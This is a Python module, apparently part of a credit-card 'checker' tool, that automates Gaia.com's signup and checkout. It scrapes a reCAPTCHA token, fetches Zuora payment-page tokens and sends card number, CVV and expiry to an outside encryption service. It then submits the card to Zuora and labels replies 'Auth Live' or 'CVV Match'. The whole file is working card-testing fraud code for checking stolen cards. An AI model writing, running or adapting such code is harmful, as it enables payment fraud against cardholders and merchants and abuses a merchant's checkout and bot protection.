import os
import time
import json
import urllib
from .rand_user import random_user_api
from ..filters.checker_defs import find_between


def one(s,mail):
    headers = {
    'authority': 'brooklyn.gaia.com',
'method': 'POST',
'path': '/email-capture',
'scheme': 'https',
'accept': 'application/json, text/javascript, */*; q=0.01',
'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
'content-type': 'application/json',
'origin': 'https://www.gaia.com',
'referer': 'https://www.gaia.com/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'
}
    data = '{"email":"'+mail+'","source":"","optin":true,"fields":{"form_name":"GAIA_HOME_PAGE","url":"/","registration_language":"en","prospect_email_comm_br":true,"prospect_behavior_segment":"br","prospect_content_id":67027},"utm":""}'
    a = s.post(url='https://brooklyn.gaia.com/email-capture', headers=headers, data=data)
    if a.status_code != 200:
        return False
    b = s.get('https://brooklyn.gaia.com/v1/billing/plans?currencyOverride&language[]=en&skus[]=G%207DF%20ANNUAL')
    if b.status_code != 200:
        return False
    url = 'https://brooklyn.gaia.com/v1/checkout/account-check'
    data = '{"email":"'+mail+'"}'
    headers = {
'authority': 'brooklyn.gaia.com',
'method': 'POST',
'path': '/v1/checkout/account-check',
'scheme': 'https',
'accept': 'application/json',
'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
'content-type': 'application/json',
'origin': 'https://www.gaia.com',
'referer': 'https://www.gaia.com/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
'x-client-attributes': 'app-provider/gaia,app/web'
}
    c = s.post(url=url, headers=headers, data=data)
    if c.status_code != 200:
        return False
    url = 'https://brooklyn.gaia.com/v1/checkout/cart-begin'
    headers = {
'authority': 'brooklyn.gaia.com',
'method': 'POST',
'path': '/v1/checkout/cart-begin',
'scheme': 'https',
'accept': 'application/json',
'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
'content-type': 'application/json',
'origin': 'https://www.gaia.com',
'referer': 'https://www.gaia.com/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
'x-client-attributes': 'app-provider/gaia,app/web'
}
    data = '{"email":"'+mail+'","sku":"G 7DF ANNUAL","language":["en"],"country":"JP","fields":{"form_name":"WEBAPP_LEAD_CAPTURE","prospect_behavior_segment":"br","prospect_email_comm_br":true,"first_name":"at"}}'
    d = s.post(data=data, headers=headers, url=url)
    if d.status_code != 200:
        return False
    url = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdiM74UAAAAAOW1SNiPwghXSo23P2kvdmOJcoVb&co=aHR0cHM6Ly93d3cuZ2FpYS5jb206NDQz&hl=vi&v=_exWVY_hlNJJl2Abm8pI9i1L&size=invisible&cb=hez6rkzdsbon'
    headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'
    }
    e = s.get(url=url, headers=headers)
    if e.status_code != 200:
        return False
    tk = find_between(e.text, 'type=\"hidden\" id=\"recaptcha-token\" value=\"', '"')
    if not tk:
        return False
    url = 'https://www.google.com/recaptcha/api2/reload?k=6LdiM74UAAAAAOW1SNiPwghXSo23P2kvdmOJcoVb'
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'
    }
    data = 'v=&reason=q&c='+tk+'&k=&co=&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg='
    resp = s.post(data=data, url=url, headers=headers)
    url = 'https://brooklyn.gaia.com/v1/billing/iframe-init'
    headers = {
    'authority': 'brooklyn.gaia.com',
    'method': 'POST',
    'path': '/v1/billing/iframe-init',
    'scheme': 'https',
    'accept': 'application/json',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://www.gaia.com',
    'referer': 'https://www.gaia.com/',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'x-client-attributes': 'app-provider/gaia,app/web'
    }
    data = '{"pageId":"2c92a00e7129cfc30171322a84d579cc","uri":"https://www.zuora.com/apps/PublicHostedPageLite.do"}'
    resp = s.post(data=data, headers=headers,url=url)
    result = resp.text
    signatur = find_between(result, 'signature":"', '","')
    vaild = find_between(result, 'token":"', '"')
    ke = find_between(result, 'key":"', '"')
    return signatur,vaild,ke



def two(s,signatur,vaild,ke, cc,mes,ano,cvv):
    signature = urllib.parse.quote_plus(signatur)
    key = urllib.parse.quote_plus(ke)
    url = 'https://encrypt.asterian.dev/zuora'
    data = json.dumps({"txtToEnc": f"##{cc}#{cvv}#{mes}#{ano}","password":"proquentin","key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhLUL+ifiFoA7Gq/RQmQUhUwTjzDHY7g7gCyMr/LHONz33C397heG6Lonhe39jf0BrENWV/UPYcchfcmhxDqJUkVUfRuFooyAmmaqV+M9VxITk7g3unrCGsEeb/dsxEjmoKrNu44+c0/vefCneSiyTq2x8l5JdhvB2KJyW5JAfq61M/U4nZUSnDqSzkVUhCccCH+/bvrcYBKgQFMwpPn5NCxIBy5WdqrvpdNDb16C7cX6hvxinpKoVb6fT6spT296vVk0BH4VJ0KQ2JAktlaeH64dKfa+oG30CzITcmxuqR+GilfVw0NztZGF56KNpy9g4Nsz2eYZAk7diEw2FJtLQwIDAQAB"
    })
    headers = {
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'
    }
    resp = s.post(data=data, headers=headers, url=url)
    dat = find_between(resp.text, 'data":"', '"')
    if not dat: return False
    data1 = urllib.parse.quote_plus(dat)
    url = 'https://www.zuora.com/apps/PublicHostedPageLite.do'
    data = f'method=submitPage&id=2c92a00e7129cfc30171322a84d579cc&tenantId=6828&token={vaild}&signature={signature}&paymentGateway=&field_authorizationAmount=&field_currency=&field_key={key}&field_style=inline&field_submitEnabled=true&field_signatureType=&host=https%3A%2F%2Fwww.gaia.com%2Fcart%2Fbilling%2Fpayment&encrypted_fields=%23field_ipAddress%23field_creditCardNumber%23field_cardSecurityCode%23field_creditCardExpirationMonth%23field_creditCardExpirationYear&encrypted_values={data1}&customizeErrorRequired=true&fromHostedPage=true&isGAccess=false&is3DSEnabled=&checkDuplicated=&captchaRequired=&captchaSiteKey=&field_mitConsentAgreementSrc=&field_mitConsentAgreementRef=&field_mitCredentialProfileType=&field_agreementSupportedBrands=&paymentGatewayType=&paymentGatewayVersion=&is3DS2Enabled=&cardMandateEnabled=&zThreeDs2TxId=&threeDs2token=&threeDs2Sig=&threeDs2Ts=&threeDs2OnStep=&threeDs2GwData=&doPayment=&storePaymentMethod=&documents=&xjd28s_6sk=627f82ccf6bf42c8b24bc62a5cb4391d&pmId=&button_outside_force_redirect=false&field_passthrough1=&field_passthrough2=&field_passthrough3=&field_passthrough4=&field_passthrough5=&field_passthrough6=&field_passthrough7=&field_passthrough8=&field_passthrough9=&field_passthrough10=&field_passthrough11=&field_passthrough12=&field_passthrough13=&field_passthrough14=&field_passthrough15=&field_accountId=&field_gatewayName=&field_deviceSessionId=&field_ipAddress=&field_useDefaultRetryRule=&field_paymentRetryWindow=&field_maxConsecutivePaymentFailures=&field_creditCardHolderName=atmos&field_creditCardNumber=&field_creditCardType=MasterCard&field_creditCardExpirationMonth=&field_creditCardExpirationYear=&field_cardSecurityCode=&field_creditCardCountry=USA&field_creditCardPostalCode=10080'
    headers = {
        'Host': 'www.zuora.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://www.zuora.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': f'https://www.zuora.com/apps/PublicHostedPageLite.do?method=requestPage&host=https%3A%2F%2Fwww.gaia.com%2Fcart%2Fbilling%2Fpayment&fromHostedPage=true&signature={signature}&token={vaild}&tenantId=6828&id=2c92a00e7129cfc30171322a84d579cc&locale=en&style=inline&retainValues=true&submitEnabled=true&customizeErrorRequired=true&zlog_level=warn',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    }
    resp = s.post(data=data, headers=headers,url=url)
    return False if resp.status_code != 200 else resp



def get_response_zho(json):
    if json['success'] == True: 
        r_text, r_logo, r_respo = "Auth Live", "✅", 'CVV Match'
    else:
        text = json['errorMessage'] if 'errorMessage' in json else "error"
        res = text.split('.')
        r_text, r_logo, r_respo = res[1], "❌", res[0]
    return r_text, r_logo, r_respo
